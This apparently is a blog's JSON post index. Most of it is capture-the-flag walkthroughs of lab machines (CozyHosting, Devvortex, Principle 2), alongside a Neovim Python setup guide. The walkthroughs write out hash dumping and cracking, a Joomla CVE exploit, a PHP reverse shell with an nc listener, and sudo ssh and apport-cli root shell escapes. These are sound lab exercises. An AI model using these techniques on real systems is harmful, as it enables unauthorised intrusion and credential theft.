truespring.datasource.driver-class-name=org.postgresql.Driverspring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialectspring.jpa.hibernate.ddl-auto=nonespring.jpa.database=POSTGRESQLspring.datasource.platform=postgresspring.datasource.url=jdbc:postgresql://localhost:5432/cozyhostingspring.datasource.username=postgresspring.datasource.password=Vg&amp;nvzAQ7XxRWe have a postgres database in the localhost, an user and a password, so let’s investigate!app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgresWe list the databases:postgres=# \\l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges-------------+----------+----------+-------------+-------------+----------------------- cozyhosting | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgresWe select cozyhosting and we list the tables:postgres=# \\c cozyhostingcozyhosting=# \\dt List of relations Schema | Name | Type | Owner--------+-------+-------+---------- public | hosts | table | postgres public | users | table | postgres(2 rows)We take a look at the users data:cozyhosting=# select * from users; name | password | role-----------+--------------------------------------------------------------+------- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | AdminNow, we have two hashes.As we was kanderson before, we will crack the admin hash.We add the admin hash to the admin_hash.txt file, and we crack it using hashcat:echo $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm &gt; admin_hash.txthashcat -a 0 -m 3200 admin_hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txtjoshOk, now we have a password and two possible users: admin and josh.So we will try them to connect using ssh.As admin does not work, let’s try josh:ssh josh@10.10.11.230We are in!Let’s take a look at our new user’s info and see what he can do:josh@cozyhosting:~$ iduid=1003(josh) gid=1003(josh) groups=1003(josh)josh@cozyhosting:~$ sudo -l[sudo] password for josh:Matching Defaults entries for josh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser josh may run the following commands on localhost: (root) /usr/bin/ssh *Privilege escalationAs we can see in GTFOBins we can exploit ssh:josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' xAnd, now, we can get our system flag!Pwned!CozyHosting has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - Triangles pwned!", "url": "/posts/htb-triangles/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, triangles", "date": "2024-02-14 01:00:01 +0100", "snippet": "Description Three vertices. Two csv files. One solution.Triangles has been PwnedEnjoy! ;)", "content": "Description Three vertices. Two csv files. One solution.Triangles has been PwnedEnjoy! ;)" }, { "title": "Hack the box - Devvortex pwned!", "url": "/posts/devvortex/", "categories": "hack the box, machine", "tags": "hack the box, devvortex, joomla, mysql", "date": "2024-02-13 01:00:01 +0100", "snippet": "Machine infoDevvortex infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.0.0.1 Target machine (victim, Devvortex): 10.10....", "content": "Machine infoDevvortex infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.0.0.1 Target machine (victim, Devvortex): 10.10.11.242EnumerationIf we list the open ports in the machine, we can see that there are two open ports: 22 (ssh) and 80 (http):sudo map -Pn -n -sS -p- --open -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.242PORT STATE SERVICE22/tcp open ssh80/tcp open httpFootprintingIf we look for more information about the services running in those ports we will find the machine address:sudo nmap -sVC -p22,80 -oN nmap_initial_versions.txt 10.10.11.242PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)| 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)|_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://devvortex.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNow, we add the machine address to our /etc/hosts:echo \"10.10.11.242 devvortex.htb\" | sudo tee -a /etc/hostsWe browse to http://devvortex.htb and we investigate the web:Devvortex webWe can’t do anything on this web, but, if we look for virtual hosts we will find dev.devvortex.htb.dev? Sounds interesting…ffuf -c -mc 200 -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.242 -H \"HOST: FUZZ.devvortex.htb\"...dev [Status: 200, Size: 23221, Words: 5081, Lines: 502]We add this new host to our /etc/hosts:echo \"10.10.11.242 dev.devvortex.htb\" | sudo tee -a /etc/hostsAnd, now, we browse to our new devvortex webdev.devortex webJoomlaUsing wappalyzer we can see that is a joomla cms:dev.devortex web infoWe take a look with joomscan and we found that is running a 4.2.6 version and some interesting paths in robots.txt:[+] Detecting Joomla Version[++] Joomla 4.2.6...[+] Checking robots.txt existing[++] robots.txt is foundpath : http://dev.devvortex.htb/robots.txtInteresting path found from robots.txthttp://dev.devvortex.htb/joomla/administrator/http://dev.devvortex.htb/administrator/http://dev.devvortex.htb/api/http://dev.devvortex.htb/bin/http://dev.devvortex.htb/cache/http://dev.devvortex.htb/cli/http://dev.devvortex.htb/components/http://dev.devvortex.htb/includes/http://dev.devvortex.htb/installation/http://dev.devvortex.htb/language/http://dev.devvortex.htb/layouts/http://dev.devvortex.htb/libraries/http://dev.devvortex.htb/logs/http://dev.devvortex.htb/modules/http://dev.devvortex.htb/plugins/http://dev.devvortex.htb/tmp/FootholdTaking a further look we find that is a jommla vulnerable version:searchsploit joomla | grep -i v4.2Joomla! v4.2.8 - Unauthenticated information disclosuresearchsploit -p 51334 Exploit: Joomla! v4.2.8 - Unauthenticated information disclosure URL: https://www.exploit-db.com/exploits/51334 Path: /opt/exploitdb/exploits/php/webapps/51334.py Codes: CVE-2023-23752 Verified: TrueFile Type: Ruby script, ASCII textWe can see that the exploit it’s a ruby script, but, with python extension.We copy it to a working folder and we install the gems required by the script:cp /opt/exploitdb/exploits/php/webapps/51334.py /home/rubenhortas/devvortex/exploits/51334.rbsudo gem install httpx docopt paintOnce we have everything ready we run the exploit:./51334.rb http://dev.devvortex.htbUsers[649] lewis (lewis) - lewis@devvortex.htb - Super Users[650] logan paul (logan) - logan@devvortex.htb - RegisteredSite infoSite name: DevelopmentEditor: tinymceCaptcha: 0Access: 1Debug status: falseDatabase infoDB type: mysqliDB host: localhostDB user: lewisDB password: f4k3l0g4np455DB name: joomlaDB prefix: sd4fg_DB encryption 0lewisNow, we have two users, and one of them with its password.So we will try to log in as administrators in http://dev.devvortex.htb/administratordev.devortex loginAnd… We are in!www-dataNow, we need to perform a lateral movement to gain shell as the user www-data.In order to do this, we will exploit the joomla template system to gain a reverse shell.We browse to System &gt; Site Templates &gt; Cassiopeia Details and Files and we inject a php shell in the error.php (because is writable) template:dev.devortex php shellWe save the change, and we start listening in our host with netcat:nc -lvnp 1234And, now, we cause a browsing error, navigating to an unexisting url, e.g.: http://dev.devvortex.htb/asdfOnce we get shell, the first thing it’s upgrating the tty, as always:script /dev/null -c bashctrl+zstty raw -echo; fgreset xtermexport TERM=xterm-256colorstty rows 56 columns 209www-data@devvortex:~/dev.devvortex.htb$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)If we look in the configuration.php file we found the database and the credentials:www-data@devvortex:~/dev.devvortex.htb$ cat configuration.php | grep -E 'user|password|\\$db' public $dbtype = 'mysqli'; public $user = 'lewis'; public $password = 'f4k3l0g4np455'; public $db = 'joomla'; public $dbprefix = 'sd4fg_'; public $dbencryption = 0; public $dbsslverifyservercert = false; public $dbsslkey = ''; public $dbsslcert = ''; public $dbsslca = ''; public $dbsslcipher = ''; public $smtpuser = ''We connect to the database and we extract the users information:mysql -u lewis -pf4k3l0g4np455 joomlamysql&gt; show tables like '%user%';+---------------------------+| Tables_in_joomla (%user%) |+---------------------------+| sd4fg_action_logs_users || sd4fg_user_keys || sd4fg_user_mfa || sd4fg_user_notes || sd4fg_user_profiles || sd4fg_user_usergroup_map || sd4fg_usergroups || sd4fg_users |+---------------------------+8 rows in set (0.00 sec)mysql&gt; select * from sd4fg_users;+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+| id | name | username | email | password | block | sendEmail | registerDate | lastvisitDate | activation | params | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+| 649 | lewis | lewis | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u | 0 | 1 | 2023-09-25 16:44:24 | 2024-02-13 13:20:06 | 0 | | NULL | 0 | | | 0 | || 650 | logan paul | logan | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 | 0 | 0 | 2023-09-26 19:15:42 | NULL | | {\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"timezone\":\"\",\"a11y_mono\":\"0\",\"a11y_contrast\":\"0\",\"a11y_highlight\":\"0\",\"a11y_font\":\"0\"} | NULL | 0 | | | 0 | |+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+2 rows in set (0.00 sec)Now, we crack the logan hashed password using hashcat.Fisrt, we save the hashed password in the hash.txt file, then we execute hashcat:hashcat -a 0 -m 3200 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txtAfter a while…loganWith the logan password we can perform a new lateral movement and connect as logan using ssh:ssh logan@10.10.11.242User flagWe can get our user flag now:cat user.txtPrivilege escalationWe check our sudo cappabilities and we find that we can execute /usr/bin/apport-cli as root:logan@devvortex:~$ sudo -l[sudo] password for logan:Matching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cliWe take a look and we can see that the binary is used to report crash records:logan@devvortex:~$ sudo /usr/bin/apport-cli --helpUsage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]Options: -h, --help show this help message and exit -f, --file-bug Start in bug filing mode. Requires --package and an optional --pid, or just a --pid. If neither is given, display a list of known symptoms. (Implied if a single argument is given.) -w, --window Click a window as a target for filing a problem report. -u UPDATE_REPORT, --update-bug=UPDATE_REPORT Start in bug updating mode. Can take an optional --package. -s SYMPTOM, --symptom=SYMPTOM File a bug report about a symptom. (Implied if symptom name is given as only argument.) -p PACKAGE, --package=PACKAGE Specify package name in --file-bug mode. This is optional if a --pid is specified. (Implied if package name is given as only argument.) -P PID, --pid=PID Specify a running program in --file-bug mode. If this is specified, the bug report will contain more information. (Implied if pid is given as only argument.) --hanging The provided pid is a hanging application. -c PATH, --crash-file=PATH Report the crash from given .apport or .crash file instead of the pending ones in /var/crash. (Implied if file is given as only argument.) --save=PATH In bug filing mode, save the collected information into a file instead of reporting it. This file can then be reported later on from a different machine. --tag=TAG Add an extra tag to the report. Can be specified multiple times. -v, --version Print the Apport version number.We create a bug report for any package in the system, e.g. at:logan@devvortex:~$ sudo /usr/bin/apport-cli -f at*** Collecting problem informationThe collected information can be sent to the developers to improve theapplication. This might take a few minutes......................*** Send problem report to the developers?After the problem report has been sent, please fill out the form in theautomatically opened web browser.What would you like to do? Your options are: S: Send report (3.0 KB) V: View report K: Keep report file for sending later or copying to somewhere else I: Cancel and ignore future crashes of this program version C: CancelPlease choose (S/V/K/I/C):We choose “V: View report”, and we are inside a vi enviroment.Luckly for us we can escape executing a bash shell:!/bin/bashFinally, we are root and we can get our system flag!cat /root/root.txtPwnedDevvortex has been PwnedEnjoy! ;)" }, { "title": "Hack the box - Keeper pwned!", "url": "/posts/htb-keeper/", "categories": "hack the box, machine", "tags": "hack the box, keeper", "date": "2024-02-11 01:00:01 +0100", "snippet": "Keeper has been PwnedEnjoy! ;)", "content": "Keeper has been PwnedEnjoy! ;)" }, { "title": "Hack the box - TwoMillion pwned!", "url": "/posts/htb-twomillion/", "categories": "hack the box, machine", "tags": "hack the box, twomillion", "date": "2024-02-03 01:00:01 +0100", "snippet": "TwoMillion has been PwnedEnjoy! ;)", "content": "TwoMillion has been PwnedEnjoy! ;)" }, { "title": "Configuring Neovim as Python IDE", "url": "/posts/neovim-python-ide/", "categories": "neovim, python", "tags": "programming, ide, python, neovim, nvim", "date": "2024-01-21 01:00:01 +0100", "snippet": "I have to admit it, [Neo]vim is my editor for everything.I started using Vim in college, and we have been together since those, but, since a time ago, now as its fork Neovim.Do I have to edit a fil...", "content": "I have to admit it, [Neo]vim is my editor for everything.I started using Vim in college, and we have been together since those, but, since a time ago, now as its fork Neovim.Do I have to edit a file? Neovim.Do I have to do a bash script? Neovim.Do I have to do a little python script? Neovim.Vim and Neovim are very lightweight and very powerful.Vim comes installed in (almost) every linux distro, and they are very convenient to use via ssh.Although for medium or large python projects my favorite IDE is Pycharm (I really love Pycharm), for small and fast (or no so fast scripts) I preffer neovim or vim, depends on which one is installed.The point is that, while I was coding some python scripts, above all using new libraries, I missed some features provided by a IDE.Features I was used to in Pycharm, as autocomplete and linting (analzing source code to flag programming errors, bugs, stylistic errors, etc.).So, I decided it was time to configure Neovim to improve my python experience.[Neo]vim base configurationThis is my base configuration.My configuration for all, in all my computers, no matter the purpose.This configuration will be the base to which I will add the python configuration.~/.config/nvim/init.vim:syntax on \"syntax highlightingfiletype plugin indent on \"file type detectionset number \"display line numberset path+=** \"improves searchingset noswapfile \"disable use of swap filesset wildmenu \"completion menuset backspace=indent,eol,start \"ensure proper backspace functionalityset incsearch \"see results while search is being typed, see :help incsearchset smartindent \"auto indent on new lines, see :help smartindentset expandtab \"expanding tab to spacesset tabstop=4 \"setting tab to 4 columnsset shiftwidth=4 \"setting tab to 4 columnsset softtabstop=4 \"setting tab to 4 columnsset showmatch \"display matching bracket or parenthesisset hlsearch incsearch \"highlight all pervious search pattern with incsearchset clipboard=unnamedplus \"activate the system clipboard\"set list \"show all whitespaces (uncomment without Better Whitespace plugin)In my base configuration I usually add the Vim Better Whitespace Plugin (I’ll talk about it later), but I keep the option “list” handy (but commented).The “list” option, by default, show tabs as “&gt;”, trailing spaces as “-“ and non-breakable space characters as “+”.This default configuration works for me, but can be customized.pyrightPyright is a static type checker for Python created by Microsoft.Pyright goes beyond just checking for syntax errors.Its primary goal is to catch type-related errors in your Python code before you even run it.Pyright helps us write more maintainable, understandable, and bug-free Python code by leveraging static type checking.pipx install pyrightpylspIn order to use nvim-cmp and nvim-lspconfig, we need to install a Language Server Protocol (LSP), in this case pylsp.The Language Server Protocol (LSP) is a protocol used between a development tool and a Language Server (LS) that provides language features like autocompletion, go-to-definition, etc.pipx install 'python-lsp-server[all]'For Neovim to load pylsp when we are working on a python file we need to create a directory, a couple files and add a little configuration to our init.vim file.The directory:mkdir /home/rubenhortas/.config/nvim/luaThe first file (lua_config.lua):echo \"`call plug#begin('/home/rubenhortas/.config/nvim/plugins')`\" &gt; /home/rubenhortas/.config/nvim/lua/lua_config.luaNow, we need to create the file /home/rubenhortas/.config/nvim/lua/lsp_config.lua, and add the following lines:local lsp = require('lspconfig')local completion = require('completion')local custom_attach = function() completion.on_attach() -- Python specifically isn't setting omnifunc correctly, ftplugin conflict vim.api.nvim_buf_set_option(0, 'omnifunc', 'v:lua.vim.lsp.omnifunc')endlsp.pylsp.setup{on_attach=custom_attach}Now, we edit our init.vim file to append the following lines:\" neovim LSP Configurationlua require('lua_config')[Neo]vim plugin managerAs plugin manager, my choice is vim-plug, and its installation it’s very straightforward:Unix/linux:sh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim'PluginsI install three plugins: nvim-cmpA completion engine plugin. nvim-lspconfigConfigs for the Nvim LSP client. Vim Better WhitespaceThis plugin highlights all trailing whitespaces.It’s totally optional and can be substituted by the option “lines” in the vim.init file, but I like it. We need to create the directory where we will install the plugins.I install my plugins in /home/rubenhortas/.config/nvim/plugins, so:mkdir `/home/rubenhortas/.config/nvim/plugins`nvim-cmpA completion engine plugin for neovim written in Lua. Completion sources are installed from external repositories and “sourced”.To install it we need to add the following to our init.vim file:call plug#begin('/home/rubenhortas/.config/nvim/plugins')Plug 'hrsh7th/cmp-nvim-lsp'Plug 'hrsh7th/cmp-buffer'Plug 'hrsh7th/cmp-path'Plug 'hrsh7th/cmp-cmdline'Plug 'hrsh7th/nvim-cmp'\" For vsnip users.Plug 'hrsh7th/cmp-vsnip'Plug 'hrsh7th/vim-vsnip'call plug#end()lua &lt;&lt;EOF -- Set up nvim-cmp. local cmp = require'cmp' cmp.setup({ snippet = { -- REQUIRED - you must specify a snippet engine expand = function(args) vim.fn[\"vsnip#anonymous\"](args.body) -- For `vsnip` users. -- require('luasnip').lsp_expand(args.body) -- For `luasnip` users. -- require('snippy').expand_snippet(args.body) -- For `snippy` users. -- vim.fn[\"UltiSnips#Anon\"](args.body) -- For `ultisnips` users. end, }, window = { -- completion = cmp.config.window.bordered(), -- documentation = cmp.config.window.bordered(), }, mapping = cmp.mapping.preset.insert({ ['&lt;C-b&gt;'] = cmp.mapping.scroll_docs(-4), ['&lt;C-f&gt;'] = cmp.mapping.scroll_docs(4), ['&lt;C-Space&gt;'] = cmp.mapping.complete(), ['&lt;C-e&gt;'] = cmp.mapping.abort(), ['&lt;CR&gt;'] = cmp.mapping.confirm({ select = true }), -- Accept currently selected item. Set `select` to `false` to only confirm explicitly selected items. }), sources = cmp.config.sources({ { name = 'nvim_lsp' }, { name = 'vsnip' }, -- For vsnip users. -- { name = 'luasnip' }, -- For luasnip users. -- { name = 'ultisnips' }, -- For ultisnips users. -- { name = 'snippy' }, -- For snippy users. }, { { name = 'buffer' }, }) }) -- Set configuration for specific filetype. cmp.setup.filetype('gitcommit', { sources = cmp.config.sources({ { name = 'git' }, -- You can specify the `git` source if [you were installed it](https://github.com/petertriho/cmp-git). }, { { name = 'buffer' }, }) }) -- Use buffer source for `/` and `?` (if you enabled `native_menu`, this won't work anymore). cmp.setup.cmdline({ '/', '?' }, { mapping = cmp.mapping.preset.cmdline(), sources = { { name = 'buffer' } } }) -- Use cmdline &amp; path source for ':' (if you enabled `native_menu`, this won't work anymore). cmp.setup.cmdline(':', { mapping = cmp.mapping.preset.cmdline(), sources = cmp.config.sources({ { name = 'path' } }, { { name = 'cmdline' } }) }) -- Set up lspconfig. local capabilities = require('cmp_nvim_lsp').default_capabilities() -- Replace &lt;YOUR_LSP_SERVER&gt; with each lsp server you've enabled. require('lspconfig')['pylsp'].setup { capabilities = capabilities }EOF Replace the plugins directory in the first line with your own. Also, replace the ‘YOUR_LSP_SERVER’ value with ‘pylsp’, our Language Server Protocol (LSP).nvim-lspconfigTo install it, we add the plugin to our init.vim file, into the call plug#begin('/home/rubenhortas/.config/nvim/plugins') section, below all the lines:call plug#begin('/home/rubenhortas/.config/nvim/plugins')...Plug 'neovim/nvim-lspconfig'call plug#end()Vim Better WhitespaceThis plugin causes all trailing whitespace characters to be highlighted.Whitespace for the current line will not be highlighted while in insert mode.It is possible to disable current line highlighting while in other modes as well.A helper function :StripWhitespace is also provided to make whitespace cleaning painless.This plugin is optional, and can be substituded by the “lines” option in the vim.init file.But, I like it, and the :StripWhitespace function is very useful.To install it we add the plugin to our init.vim file, into the call plug#begin('/home/rubenhortas/.config/nvim/plugins') section, below all the lines:call plug#begin('/home/rubenhortas/.config/nvim/plugins')...Plug 'ntpeters/vim-better-whitespace'call plug#end()Installing the pluginsTo install the plugins we open nvim and run::PlugInstallIgnoring errorsI find quite annoying the “E501 line too long error”.I think that 80 (or 100) characters are a little short sometimes for the screens we have today.If you, as me, want to ignore this error (and/or others), you can create the file ~/.config/pycodestyle and specify what errors you want to ignore:[pycodestyle]ignore = E501And, that’s all. Now you can start to using Neovim as your Python IDE!ScreenshotsExample of autocompletionExample of linting errors and trailing whitespacesEnjoy! ;)" }, { "title": "Hack The Box - Micro Storage pwned!", "url": "/posts/htb-micro-storage/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, micro storage", "date": "2023-12-25 01:00:01 +0100", "snippet": "Description Some group of people seem to have made a network service that lets you store files temporarily. But little did they know about the mistake they made coding their script… Try to get fam...", "content": "Description Some group of people seem to have made a network service that lets you store files temporarily. But little did they know about the mistake they made coding their script… Try to get familiar with their service and discover the vulnerability behind it. Your goal is to leak the contents of /𝗳𝗹𝗮𝗴.𝘁𝘅𝘁.Micro Storage has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - QuickR pwned!", "url": "/posts/htb-quickr/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, quickr", "date": "2023-12-24 01:00:01 +0100", "snippet": "Challenge description Let’s see if you’re a QuickR soldier as you pretend to beenSolutionI think this is a very easy challenge.You only have to get the QR shown in console, read it and send the re...", "content": "Challenge description Let’s see if you’re a QuickR soldier as you pretend to beenSolutionI think this is a very easy challenge.You only have to get the QR shown in console, read it and send the result of the equation that contains in less than tree seconds.Although it’s easy, it’s fun and it’s a good challenge to practice programming.To solve this challenge I did a python script that you can see here: quickr.pyQuickR has been PwnedEnjoy! ;)" }, { "title": "Hack My VM - Principle 2", "url": "/posts/hmv-principle2/", "categories": "hackmyvm, vm", "tags": "hackmyvm, walkthrough, hmv, principle, rpc, nfs, user impersonation, steganography, path traversal, lfi, log poisoning, reverse proxy, chisel, hydra, binary hijack", "date": "2023-12-18 01:00:01 +0100", "snippet": "HMV Principle 2I was back to acting last beta tester for my friend Kaian.I have dedicated the last few days to solve Kaian’s last machine: Principle 2 for HackMyVM.I really, admire A LOT all the wo...", "content": "HMV Principle 2I was back to acting last beta tester for my friend Kaian.I have dedicated the last few days to solve Kaian’s last machine: Principle 2 for HackMyVM.I really, admire A LOT all the work behind each of one of these boxes.Again, it was a very fun machine and it was a great experience help him, but, this time I have to admit that was a little more complicated.This time it was a medium level machine, and to solve Principle 2, I had to learn a few new tricks.And, as always, once completed the box, it’s time to write my walkthough.Annotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.0.0.1 Target machine (victim, Principle 2 box): 10.0.0.2Warnings Take a snapshot of the machine just after a fresh install.You may need it later.EnumerationLet’s see what services are running:nmap -Pn -n -p- -T5 --min-rate 5000 10.0.0.2Nmap scan report for 10.0.0.2Host is up (0.00016s latency).Not shown: 63482 closed tcp ports (reset), 2043 filtered tcp ports (no-response)PORT STATE SERVICE80/tcp open http111/tcp open rpcbind139/tcp open netbios-ssn445/tcp open microsoft-ds2049/tcp open nfs33591/tcp open unknown36599/tcp open unknown37023/tcp open unknown47791/tcp open unknown49353/tcp open unknownWe can see trhee interesting services: web service, rpc and nfs.Web serviceIf we browse to the machine, we will find the default apache webpage:Default apache web pageRPC/NFSIf you find nfs then, probably, you can list and download (maybe upload) files.Let’s take a look:$ showmount -e 10.0.0.2Export list for 10.0.0.2:/var/backups */home/byron *Let’s mount them and see what we find:$ sudo mount -t nfs 10.0.0.2:/var/backups /tmp/backups -o nolock$ sudo mount -t nfs 10.0.0.2:/home/byron /tmp/byron -o nolock/home/byron$ ls -la /tmp/byron...lrwxrwxrwx 1 root root 9 Nov 25 12:33 .bash_history -&gt; /dev/null-rw-r--r-- 1 1001 1001 220 Apr 23 2023 .bash_logout-rw-r--r-- 1 1001 1001 3526 Apr 23 2023 .bashrcdrwxr-xr-x 3 1001 1001 4096 Nov 23 07:13 .local-rw-r--r-- 1 1001 1001 114 Nov 19 18:55 mayor.txt-rw-r--r-- 1 1001 1001 219 Nov 23 07:22 memory.txt-rw-r--r-- 1 1001 1001 807 Apr 23 2023 .profileAfter examining the files, the only interesting files that we found are mayor.txt and memory.txt.$ cat /tmp/byron/mayor.txtNow that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.mayor.txt tells us a little about the relation between Byron and Hermanubis:$ cat /tmp/byron/memory.txtHermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.memory.txt tells us about Hermanubis lost his password, and the most interesting, Byron keeps a record (a backup, maybe?) of each neighbor password encoded in hexadecimal./var/backupsLet’s take a look to /backups:$ ls -la /tmp | grep backupsdrwxr--r-- 2 54 backup 28672 Nov 28 19:00 backupsWe can’t read the files inside /backups because the lack of permissions.But, we can see that the owner of /backups is the user with UID 54, so we can impersonate that user by creating a new one with this UID:$ sudo useradd -u 54 principle2 -g backup$ sudo mkdir /tmp/bkp$ sudo chown principle2 -R /tmp/bkp$ sudo chmod 755 -R /tmp/bkpWith our new user we can read the files inside /backups:$ sudo su principle2$ ls /tmp/backupsAnd we see that there are a lot of text files naming with numbers.Filenames seems like a code, doesn’t?SMBNow, let’s take a look at smb:$ enum4linux -a 10.0.0.2... Sharename Type Comment --------- ---- ------- public Disk New Jerusalem Public hermanubis Disk Hermanubis share IPC$ IPC IPC Service (Samba 4.17.12-Debian)...//10.0.0.2/public Mapping: OK Listing: OK Writing: N/A//10.0.0.2/hermanubis Mapping: DENIED Listing: N/A Writing: N/AWe can see that we can read in /public, and we found the user hermanubis and we can’t read (or write) in /hermanubis.Let’s mount them and take a look:/public$ sudo mount -t cifs //10.0.0.2/public /tmp/public$ ls -la /tmp/public...-rwxr-xr-x 1 root root 931 Nov 19 07:01 loyalty.txt-rwxr-xr-x 1 root root 158 Nov 19 07:01 new_era.txt-rwxr-xr-x 1 root root 718 Nov 19 07:00 straton.txtWe keep finding details of the history between Byron and Hermanubis:$ cat /tmp/backups/loyalty.txtThis text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.2257686f2061726520796f752c207468656e3f22To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.2257686f2061726520796f752c207468656e3f22?$ echo \"2257686f2061726520796f752c207468656e3f22\" | xxd -p -r\"Who are you, then?\"%The hexadecimal string doesn’t seem very interesting. What does seem interesting is the Byron (7) and Hermanubis (452) part.Could this numbers be the “neighbor IDs”?$ cat /tmp/backups/452.txt4279726f6e4973417373686f6c650a0a$ echo -n 4279726f6e4973417373686f6c650a0a | xxd -p -rByronIsAssholeIt looks like a possible password…And we found a couple more pieces about New Jerusalem history:$ cat new_era.txtYesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.$ cat straton.txtThis fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.AMYNTAS: But what does this tell us about the nature of the universe, which is what we were discussing?STRATON: That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?/hermanubisLet’s mount /hermanubis now:sudo mount -t cifs //10.0.0.2/hermanubis /tmp/hermanubis -o username=hermanubisAsks for a password, let’s try ByronIsAsshole…$ ls... index.html N 346 Tue Nov 28 09:44:41 2023 prometheus.jpg N 307344 Tue Nov 28 12:23:24 2023$ cat index.html... &lt;h1&gt;Welcome to the resistance forum&lt;/h1&gt; &lt;p&gt;free our chains!&lt;/p&gt; &lt;img src=\"prometheus.jpg\" alt=\"chained\"&gt;The only information we get with index.html is that Hermanubis is in the resistance.Let’s apply steganographic analysis to prometheus.jpg:$ stegseek prometheus.jpg /usr/share/wordlists/rockyou.txt...[i] Found passphrase: \"soldierofanubis\"[i] Original filename: \"secret.txt\".[i] Extracting to \"prometheus_message.txt\".$ cat prometheus_message.txtI have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmvthetruthoftalos.hmvOk, now that we have a new domain, we append it to our /etc/hosts:$ echo \"10.0.0.2 thetruthoftalos.hmv\" | sudo tee -a /etc/hosts10.0.0.2 thetruthoftalos.hmvIf we browse to thetruthoftalos.hmv we will found nothing (literally):thetruthoftalos.hmv index.htmlDirectory enumerationWe will search for resources on our new host:$ gobuster dir -u http://thetruthoftalos.hmv --wordlist /usr/share/wordlists/dirb/common.txt -b 403,404 -x php,html,txt.../index.html (Status: 200) [Size: 8]/index.php (Status: 200) [Size: 1970]/index.php (Status: 200) [Size: 1970]/index.html (Status: 200) [Size: 8]/uploads (Status: 301) [Size: 169] [--&gt; http://thetruthoftalos.hmv/uploads/]index.phpthetruthoftalos.hmv index.phpWe can type the name of a god and we will see info about it. Talks about twelve gods, but, there are fourteen ;)Path 